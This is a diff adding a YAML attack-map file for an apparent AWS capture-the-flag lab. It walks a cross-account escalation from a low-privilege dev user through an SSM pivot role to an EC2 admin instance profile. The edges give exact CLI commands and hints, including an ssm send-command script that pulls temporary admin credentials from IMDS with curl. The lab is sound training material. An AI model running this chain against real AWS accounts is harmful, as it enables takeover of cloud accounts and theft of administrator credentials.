@@ -1,0 +1,169 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Dev Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{dev_account_id}:user/pl-dev-ssm-ec2-starting-user"
+      access:
+        type: assumed-breach-credentials
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could have been
+        obtained through many real-world vectors: phishing a developer and gaining access to their
+        workstation, compromising a browser session, exploiting a vulnerable workload running in
+        this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded
+        in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This is `pl-dev-ssm-ec2-starting-user` — a low-privilege IAM user in the dev account.
+        It has permission to assume a specific role in the prod account, giving you a foothold
+        across the account boundary.
+
+    - id: pivot-role
+      label: "Prod Pivot Role"
+      type: principal
+      subType: iam-role
+      arn: "arn:aws:iam::{prod_account_id}:role/pl-prod-ssm-ec2-pivot-role"
+      description: >
+        This is `pl-prod-ssm-ec2-pivot-role` — a role in the prod account trusted by the dev
+        starting user. It was granted SSM permissions broad enough to send commands to any
+        SSM-managed EC2 instance in the prod account. Although it cannot directly read sensitive
+        data or modify IAM, it can reach every instance running the SSM agent, including the
+        one carrying an admin instance profile.
+
+    - id: ec2-instance
+      label: "EC2 Instance"
+      type: resource
+      subType: ec2-instance
+      arn: "arn:aws:ec2:{region}:{prod_account_id}:instance/{instance_id}"
+      description: >
+        This EC2 instance (`pl-prod-ssm-ec2-instance`) is running in the prod account with
+        the SSM agent active and an admin IAM instance profile (`pl-prod-ssm-ec2-admin-role`)
+        attached. Because the instance profile binds an admin role to the instance's identity,
+        anything running inside the instance — including SSM-delivered shell commands — can
+        retrieve temporary admin credentials from the Instance Metadata Service (IMDS) at
+        `169.254.169.254`.
+
+    - id: admin-role
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isAdmin: true
+      arn: "arn:aws:iam::{prod_account_id}:role/pl-prod-ssm-ec2-admin-role"
+      description: >
+        This is `pl-prod-ssm-ec2-admin-role` — the IAM role attached as the EC2 instance profile.
+        It carries `AdministratorAccess`, granting full control over the prod account. The IMDS
+        endpoint on the EC2 instance vends short-lived credentials for this role to any process
+        running on the instance — including shell commands delivered via SSM. Once you have these
+        credentials, you hold administrator-equivalent access.
+
+    - id: ctf-flag
+      label: "CTF Flag"
+      type: resource
+      subType: ssm-parameter
+      isTarget: true
+      arn: "arn:aws:ssm:{region}:{prod_account_id}:parameter/pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin"
+      description: >
+        The CTF flag for this scenario is stored as a SecureString parameter in AWS Systems Manager
+        Parameter Store. Retrieving it requires `ssm:GetParameter` on this specific parameter path —
+        a permission that `pl-prod-ssm-ec2-admin-role`'s `AdministratorAccess` policy provides
+        implicitly. The flag proves end-to-end exploitation of the cross-account SSM-to-IMDS chain.
+
+  edges:
+    - from: starting-principal
+      to: pivot-role
+      label: "sts:AssumeRole (cross-account)"
+      description: >
+        The dev starting user assumes `pl-prod-ssm-ec2-pivot-role` in the prod account using a
+        cross-account `sts:AssumeRole` call. The pivot role's trust policy explicitly allows the
+        dev starting user's ARN to assume it, creating the cross-account bridge. The returned
+        temporary credentials are used for all subsequent SSM operations in the prod account.
+      commands:
+        - description: "Assume the prod pivot role from the dev account"
+          command: >
+            aws sts assume-role \
+              --role-arn arn:aws:iam::{prod_account_id}:role/pl-prod-ssm-ec2-pivot-role \
+              --role-session-name dev-to-prod-ssm-attack
+        - description: "Export the returned credentials"
+          command: |
+            export AWS_ACCESS_KEY_ID=<AssumedRoleId.AccessKeyId>
+            export AWS_SECRET_ACCESS_KEY=<AssumedRoleId.SecretAccessKey>
+            export AWS_SESSION_TOKEN=<AssumedRoleId.SessionToken>
+        - description: "Confirm you are now the pivot role"
+          command: "aws sts get-caller-identity"
+      hints:
+        - "The dev starting user has permission to assume a specific role in the prod account. Use sts:AssumeRole with the prod account role ARN, then export the returned temporary credentials."
+        - "After the AssumeRole call completes, export AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, and AWS_SESSION_TOKEN from the Credentials block in the response — subsequent commands will use these automatically."
+
+    - from: pivot-role
+      to: ec2-instance
+      label: "ssm:SendCommand"
+      description: >
+        Using the pivot role's credentials, send a shell command to the target EC2 instance via the
+        `AWS-RunShellScript` SSM document. The command script uses IMDSv2 to fetch the instance's
+        IAM role name and temporary credentials, then uses those credentials to read the CTF flag
+        directly from SSM Parameter Store — all within a single remote command invocation.
+        Poll `ssm:GetCommandInvocation` until the command reaches a terminal state and capture
+        the standard output containing the flag.
+      commands:
+        - description: "Enumerate EC2 instances to find the target instance ID"
+          command: >
+            aws ec2 describe-instances \
+              --query 'Reservations[*].Instances[*].[InstanceId,State.Name,Tags[?Key==`Name`].Value|[0]]' \
+              --output table
+        - description: "Confirm the instance is reachable via SSM"
+          command: >
+            aws ssm describe-instance-information \
+              --query 'InstanceInformationList[*].[InstanceId,PingStatus]' \
+              --output table
+        - description: "Send a shell command to retrieve IMDS credentials and read the CTF flag"
+          command: >
+            aws ssm send-command \
+              --instance-ids <instance-id> \
+              --document-name AWS-RunShellScript \
+              --parameters 'commands=["TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600)","ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)","CREDS=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE)","export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c \"import sys,json;print(json.load(sys.stdin)['\''AccessKeyId'\''])\")", "export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c \"import sys,json;print(json.load(sys.stdin)['\''SecretAccessKey'\''])\")", "export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c \"import sys,json;print(json.load(sys.stdin)['\''Token'\''])\")", "aws ssm get-parameter --name /pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin --query Parameter.Value --output text"]' \
+              --query 'Command.CommandId' \
+              --output text
+        - description: "Poll for the command result (replace <command-id> with the ID returned above)"
+          command: >
+            aws ssm get-command-invocation \
+              --command-id <command-id> \
+              --instance-id <instance-id> \
+              --query '[Status,StandardOutputContent]' \
+              --output table
+      hints:
+        - "Use ssm:SendCommand with the AWS-RunShellScript document to run an arbitrary shell script on the instance. Inside that script, first fetch an IMDSv2 token with a PUT to http://169.254.169.254/latest/api/token, then use it to GET the role name and credentials from the /meta-data/iam/security-credentials/ path."
+        - "The IMDS response contains AccessKeyId, SecretAccessKey, and Token — export all three as environment variables inside the script, then call aws ssm get-parameter to read the flag using the instance role's admin credentials. Poll ssm:GetCommandInvocation until Status is Success before reading StandardOutputContent."
+        - "The instance allows both IMDSv1 and IMDSv2 (http_tokens = optional). The commands shown use IMDSv2 — make the preliminary PUT request to /latest/api/token with the X-aws-ec2-metadata-token-ttl-seconds header and pass the returned token in all subsequent metadata requests. IMDSv1 plain-curl requests would also work here, but IMDSv2 is the recommended approach."
+
+    - from: ec2-instance
+      to: admin-role
+      label: "IMDS credential retrieval"
+      description: >
+        The shell command running inside the EC2 instance queries the Instance Metadata Service
+        (IMDS) for the temporary credentials associated with the attached admin instance profile
+        (`pl-prod-ssm-ec2-admin-role`). These credentials are automatically rotated and vended
+        by the EC2 service — no additional authentication is required from within the instance.
+      commands: []
+      hints: []
+
+    - from: admin-role
+      to: ctf-flag
+      label: "Read CTF flag"
+      description: >
+        Using the `pl-prod-ssm-ec2-admin-role` temporary credentials retrieved from IMDS, read
+        the CTF flag from SSM Parameter Store. The `AdministratorAccess` policy attached to this
+        role grants `ssm:GetParameter` on all parameters in the account, including the flag at
+        `/pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin`. In the demo script this
+        command runs inside the SSM shell script delivered via SendCommand, so the flag appears
+        in the command's standard output.
+      commands:
+        - description: "Retrieve the CTF flag using the instance role's admin credentials"
+          command: >
+            aws ssm get-parameter \
+              --name /pathfinding-labs/flags/ssm-startsession-ec2-admin-to-admin \
+              --query 'Parameter.Value' \
+              --output text
+      hints:
+        - "You now hold admin-equivalent credentials from the instance role. The flag is stored in AWS Systems Manager Parameter Store under a predictable path. Use ssm:GetParameter with the scenario-specific parameter name to retrieve it."
+        - "Consider the SSM Parameter Store hierarchy — scenario flags live under /pathfinding-labs/flags/ followed by the scenario identifier."
